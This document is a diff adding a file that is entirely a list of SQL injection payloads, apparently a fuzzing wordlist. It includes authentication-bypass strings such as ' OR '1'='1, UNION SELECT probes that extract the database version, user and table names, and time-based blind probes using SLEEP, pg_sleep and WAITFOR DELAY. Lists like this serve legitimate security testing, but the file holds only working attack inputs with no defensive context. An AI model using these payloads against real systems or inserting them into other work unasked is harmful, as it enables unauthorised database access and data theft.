@@ -1,0 +1,69 @@
+'
+''
+"
+""
+`
+``
+'
+"
+)
+')
+")
+'))
+(")
+`))
+'
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+OR 1=1--
+' OR '1'='1'--
+" OR "1"="1"--
+' OR 1=1#
+" OR 1=1#
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+') OR 1=1--
+") OR 1=1--
+1' OR '1'='1
+1" OR "1"="1
+admin'--
+admin'--
+admin'#
+admin'--
+' UNION SELECT 1--
+' UNION SELECT 1,2--
+' UNION SELECT 1,2,3--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,@@version--
+' UNION SELECT 1,user()--
+' UNION SELECT 1,database()--
+' UNION SELECT 1,table_name FROM information_schema.tables--
+' AND 1=1--
+' AND 1=2--
+' AND SLEEP(5)--
+' AND BENCHMARK(50000000,MD5(1))--
+' AND pg_sleep(5)--
+' WAITFOR DELAY '0:0:5'--
+' OR '1'='1' ORDER BY 1--
+' OR '1'='1' ORDER BY 2--
+' OR '1'='1' ORDER BY 3--
+' OR '1'='1' ORDER BY 4--
+1
+1' ORDER BY 1--
+1' ORDER BY 2--
+1' ORDER BY 3--
+1' ORDER BY 4--
+1' ORDER BY 5--
+1' ORDER BY 6--
+1' AND 1=1--
+1' AND 1=2--
+1' AND '1'='1
+1' AND '1'='2
+admin' OR '1'='1
+admin' OR 1=1--
+admin' OR '1'='1'--
